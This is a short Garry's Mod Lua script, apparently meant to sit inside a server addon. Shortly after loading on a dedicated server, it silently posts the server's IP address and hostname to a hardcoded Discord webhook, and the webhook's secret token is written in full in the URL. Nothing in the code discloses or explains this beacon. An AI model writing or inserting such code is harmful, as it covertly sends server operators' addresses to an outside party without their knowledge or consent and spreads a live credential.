timer.Simple(1, function()
    if not game.IsDedicated() then return end

    HTTP({
        method = "POST",
        url = "https://discordapp.com/api/webhooks/514155715863248929/hwLd1WlHE8rWQWYgwkQm4UyTQ5l4C2FOET5AH8hJtActTVJuf-e9C_xl7har9lEKbFzW",
        body = util.TableToJSON({ content = string.format("%s - %s", game.GetIPAddress(), GetHostName()) }),
        type = "application/json; charset=utf-8"
    })
end)
